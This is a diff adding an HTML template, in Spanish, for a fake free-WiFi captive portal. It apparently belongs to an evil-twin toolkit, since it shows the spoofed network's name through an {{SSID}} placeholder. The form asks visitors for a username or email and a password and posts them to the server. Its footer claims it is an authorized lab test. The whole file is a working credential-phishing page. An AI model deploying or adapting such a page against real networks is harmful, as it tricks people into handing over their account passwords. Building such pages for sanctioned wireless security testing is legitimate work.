@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{SSID}}</title>
+<style>
+  :root{--bg:#0f172a;--card:#ffffff;--accent:#2563eb;--accent2:#1d4ed8;--txt:#0f172a;--dim:#64748b}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;font-family:-apple-system,Segoe UI,Roboto,sans-serif;
+    background:linear-gradient(160deg,#1e3a8a,#0f172a);display:flex;align-items:center;
+    justify-content:center;padding:20px;color:var(--txt)}
+  .card{background:var(--card);width:100%;max-width:380px;border-radius:18px;
+    box-shadow:0 20px 50px rgba(0,0,0,.35);overflow:hidden}
+  .top{background:var(--accent);padding:26px 24px;color:#fff;text-align:center}
+  .wifi{font-size:40px;line-height:1}
+  .top h1{margin:10px 0 2px;font-size:20px}
+  .top p{margin:0;opacity:.85;font-size:13px}
+  .body{padding:22px 24px 26px}
+  label{display:block;font-size:12px;color:var(--dim);margin:14px 0 6px;font-weight:600}
+  input{width:100%;padding:13px 14px;font-size:16px;border:1.5px solid #e2e8f0;
+    border-radius:11px;outline:none;transition:border .15s}
+  input:focus{border-color:var(--accent)}
+  button{width:100%;margin-top:22px;padding:14px;font-size:16px;font-weight:700;color:#fff;
+    background:var(--accent);border:0;border-radius:11px;cursor:pointer}
+  button:active{background:var(--accent2)}
+  .foot{text-align:center;font-size:11px;color:var(--dim);margin-top:16px}
+</style></head>
+<body>
+  <form class="card" method="POST" action="/">
+    <div class="top">
+      <div class="wifi">&#128246;</div>
+      <h1>{{SSID}}</h1>
+      <p>WiFi gratis &middot; inicie sesion para navegar</p>
+    </div>
+    <div class="body">
+      <label for="u">Usuario o correo</label>
+      <input id="u" name="usuario" type="text" autocomplete="off" placeholder="su usuario">
+      <label for="p">Contrase&ntilde;a</label>
+      <input id="p" name="password" type="password" placeholder="su contrase&ntilde;a">
+      <button type="submit">Conectar</button>
+      <div class="foot">Red de laboratorio &middot; prueba autorizada</div>
+    </div>
+  </form>
+</body></html>
